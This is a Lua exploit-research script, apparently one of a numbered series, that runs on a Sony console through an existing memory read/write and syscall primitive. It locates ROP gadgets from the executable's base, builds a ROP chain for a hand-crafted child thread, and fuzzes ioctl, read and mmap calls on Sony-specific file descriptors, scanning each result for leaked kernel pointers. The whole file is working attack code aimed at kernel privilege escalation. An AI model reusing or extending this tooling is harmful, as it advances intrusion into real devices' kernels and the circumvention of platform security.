-- CRASH_CLASS: MODERATE
-- PROBE 114a: probe Sony-custom fd types from child thread
--
-- 113a found 3 fds with non-POSIX file types:
--   fd 7:  mode=0xB000 (unknown Sony type)
--   fd 9:  mode=0x91B6 (Sony type 0x9000, rw-rw-rw-)
--   fd 15: mode=0x91FF (Sony type 0x9000, rwxrwxrwx)
--
-- Also interesting CHR devices: fd 4,5,6 (mode=0x21FF, consecutive inos)
--
-- Tests per fd: ioctl, read, fcntl, mmap (all from child thread)
-- Then: try ioctl with Sony-specific command groups on fd 7/9/15

print("=== PROBE 114a: SONY FD PROBE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local function ga(off) return uint64(string.format("0x%X%08X",ehi,elo+off)) end
local PRAX=ga(0x992); local PRDI=ga(0xC9DFE)
local PRSI=ga(0xD77D); local WMOV=ga(0x92C67)

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430)

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(16*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl500=R+0x40; wq(sl500,uint64(0)); wq(sl500+8,uint64(500000000))
local tb=R+0x80
local RESULT=R+0x1000
local child_stk=R+0x4000*2
local child_ctx=R+0x4000*4
local BUF=R+0x4000*6

local function child_syscall(sysno, a1, a2, a3, a4, a5)
    z(child_ctx, 0x200)
    wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
    wq(child_ctx+_TP,uint64(0x10000))
    wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
    wq(child_ctx+_SP,uint64(child_stk))
    wq(child_ctx+_IP,SA)
    wq(child_ctx+_AX,uint64(sysno))
    wq(child_ctx+_DI,uint64(a1 or 0))
    wq(child_ctx+_SI,uint64(a2 or 0))
    wq(child_ctx+_DX,uint64(a3 or 0))
    wq(child_ctx+_R10,uint64(a4 or 0))
    wq(child_ctx+_R8,uint64(a5 or 0))

    local off=0
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(RESULT)); off=off+8
    wq(child_stk+off,WMOV); off=off+8
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(ts999)); off=off+8
    wq(child_stk+off,PRSI); off=off+8
    wq(child_stk+off,uint64(0)); off=off+8
    wq(child_stk+off,PRAX); off=off+8
    wq(child_stk+off,uint64(240)); off=off+8
    wq(child_stk+off,SA); off=off+8

    wq(RESULT,uint64(0xDEADCAFE))
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
    native.fcall_with_rax(stub,240,N(sl500),0)

    local c = N(native.fcall_with_rax(stub,20))
    if c~=pid then return nil, false end

    local rv_lo = rd(RESULT) or 0
    local rv_hi = rd(RESULT+4) or 0
    if rv_lo==0xDEADCAFE and rv_hi==0 then return -999, true end
    if rv_hi==0xFFFFFFFF then return -1, true end
    return rv_lo, true
end

local function scan_kptrs(addr, size)
    local found = 0
    for off=0,size-8,8 do
        local val = rq(addr+off)
        if is_kptr(val) then
            found = found + 1
            print(string.format("      *** KPTR +0x%X: %s ***", off, fmt_ptr(val)))
        end
    end
    return found
end

local target_fds = {7, 9, 15, 4, 5, 6}

-- ============================================================
print("--- A: IOCTL FROM CHILD on interesting fds ---")
-- ioctl = sys 54: ioctl(fd, cmd, data)
-- Try a range of common cmd values including Sony ranges
-- FreeBSD ioctl encoding: bits 29-30=direction, 16-28=size, 8-15=group, 0-7=num
-- Sony groups might be: 's'=0x73, 'S'=0x53, 'G'=0x47 (GPU), etc.

local ioctl_cmds = {
    -- Standard queries
    0x4004667F,  -- FIONREAD
    0x8004667E,  -- FIONBIO
    0x40046679,  -- FIOGETOWN
    -- Sony-likely ranges
    0x40087301,  -- 's' group, read 8 bytes, cmd 1
    0x40087302,  -- 's' group, cmd 2
    0xC0087301,  -- 's' group, read/write, cmd 1
    0x40085301,  -- 'S' group
    0x40084701,  -- 'G' group (GPU?)
    0x40084702,  -- 'G' group cmd 2
    0x80740001,  -- Sony error pattern inverted
    0x40200001,  -- generic read 32 bytes
    0x40200002,
    0xC0200001,  -- generic rw 32 bytes
}

for _, fd in ipairs(target_fds) do
    print(string.format("  fd=%d:", fd))
    local found_working = false
    for _, cmd in ipairs(ioctl_cmds) do
        z(BUF, 0x100)
        local rv, alive = child_syscall(54, fd, cmd, BUF)
        if not alive then
            print(string.format("    ioctl(0x%08X): KILLED", cmd))
            return
        end
        if rv ~= -1 and rv ~= -999 then
            found_working = true
            print(string.format("    ioctl(0x%08X): rv=%d *** WORKS ***", cmd, rv))
            -- Dump output buffer
            for off=0,0x38,8 do
                local val = rq(BUF+off)
                if val then
                    local tag = is_kptr(val) and " ***KPTR***" or ""
                    print(string.format("      +0x%02X: %s%s", off, fmt_ptr(val), tag))
                end
            end
        end
    end
    if not found_working then
        print("    all ioctls returned -1")
    end
end

-- ============================================================
print("")
print("--- B: READ FROM CHILD on interesting fds ---")
-- read = sys 3: read(fd, buf, nbytes)
for _, fd in ipairs(target_fds) do
    z(BUF, 0x200)
    -- Use O_NONBLOCK semantics: small read, won't block
    -- First set O_NONBLOCK via fcntl from child
    -- fcntl = sys 92, F_SETFL=4, O_NONBLOCK=4
    child_syscall(92, fd, 4, 4)  -- F_SETFL, O_NONBLOCK

    local rv, alive = child_syscall(3, fd, BUF, 0x100)
    if not alive then
        print(string.format("  fd=%d read: KILLED", fd))
        return
    end
    if rv and rv > 0 then
        print(string.format("  fd=%d read: %d bytes!", fd, rv))
        local kp = scan_kptrs(BUF, rv)
        -- Show first 64 bytes
        for off=0,math.min(rv-1,0x38),8 do
            print(string.format("    +0x%02X: %s", off, fmt_ptr(rq(BUF+off))))
        end
    elseif rv==-999 then
        print(string.format("  fd=%d read: child died", fd))
    else
        print(string.format("  fd=%d read: rv=%d", fd, rv or -1))
    end
end

-- ============================================================
print("")
print("--- C: MMAP WITH SONY FDs ---")
-- mmap(NULL, 0x4000, PROT_READ, MAP_SHARED, fd, 0)
-- If a Sony kernel object supports mmap, the mapping might contain kernel data
for _, fd in ipairs({7, 9, 15}) do
    local rv, alive = child_syscall(477, 0, 0x4000, 1, 1, fd, 0)
    if not alive then
        print(string.format("  fd=%d mmap: KILLED", fd))
        return
    end
    if rv and rv > 0 and rv ~= 0xFFFFFFFF then
        print(string.format("  fd=%d mmap: addr=0x%X *** MAPPED! ***", fd, rv))
        local kp = scan_kptrs(rv, 0x100)
        print(string.format("    kernel pointers in mapping: %d", kp))
    elseif rv==-999 then
        print(string.format("  fd=%d mmap: child died", fd))
    else
        print(string.format("  fd=%d mmap: rv=%d (failed)", fd, rv or -1))
    end
end

-- ============================================================
print("")
print("--- D: DEEP IOCTL SCAN on fd 7 (0xB000 type) ---")
-- fd 7 is the most unusual. Scan wider ioctl range.
-- Try command groups 0x00-0xFF with read direction, small size
print("  scanning ioctl groups on fd 7...")
local working_ioctls = 0
for group=0,255 do
    -- cmd = direction(read=0x40) | size(8)<<16 | group<<8 | num(1)
    local cmd = 0x40080001 + group * 256
    z(BUF, 0x100)
    local rv, alive = child_syscall(54, 7, cmd, BUF)
    if not alive then
        print(string.format("    group 0x%02X KILLED", group))
        return
    end
    if rv ~= -1 and rv ~= -999 then
        working_ioctls = working_ioctls + 1
        print(string.format("    group=0x%02X cmd=0x%08X: rv=%d", group, cmd, rv))
        -- Check buffer for kernel pointers
        scan_kptrs(BUF, 0x40)
    end
end
print(string.format("  fd 7 working ioctl groups: %d/256", working_ioctls))

-- Repeat for fd 9
print("  scanning ioctl groups on fd 9...")
working_ioctls = 0
for group=0,255 do
    local cmd = 0x40080001 + group * 256
    z(BUF, 0x100)
    local rv, alive = child_syscall(54, 9, cmd, BUF)
    if not alive then
        print(string.format("    group 0x%02X KILLED", group))
        return
    end
    if rv ~= -1 and rv ~= -999 then
        working_ioctls = working_ioctls + 1
        print(string.format("    group=0x%02X cmd=0x%08X: rv=%d", group, cmd, rv))
        scan_kptrs(BUF, 0x40)
    end
end
print(string.format("  fd 9 working ioctl groups: %d/256", working_ioctls))

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 114a COMPLETE ===")
